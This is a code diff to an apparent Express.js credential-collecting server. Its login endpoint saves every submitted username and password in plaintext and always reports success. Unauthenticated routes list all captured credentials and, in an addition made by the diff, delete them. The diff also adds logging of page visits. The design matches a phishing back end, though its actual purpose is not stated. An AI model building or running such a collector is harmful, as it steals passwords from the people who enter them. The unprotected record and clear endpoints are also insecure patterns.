@@ -22,15 +22,22 @@ function saveRecord(type, username = null, password = null) {
         [type, username, password, timestamp]);
 }
 
-// Login
+app.get('/', (req, res) => {
+    saveRecord('Page Visit');
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+app.get('/login.html', (req, res) => {
+    saveRecord('Login Page Visit');
+    res.sendFile(path.join(__dirname, 'public', 'login.html'));
+});
+
 app.post('/api/login', (req, res) => {
     const { username, password } = req.body;
     saveRecord('Login Attempt', username, password);
-    console.log('Login Recorded:', username);
     res.json({ success: true });
 });
 
-// Get records
 app.get('/api/records', (req, res) => {
     db.all("SELECT * FROM records ORDER BY id DESC", [], (err, rows) => {
         res.json(rows);
@@ -39,6 +46,11 @@ app.get('/api/records', (req, res) => {
 
 app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+});
+
+app.post('/api/clear', (req, res) => {
+    db.run("DELETE FROM records");
+    res.json({ message: 'Cleared' });
 });
 
 const PORT = process.env.PORT || 3000;
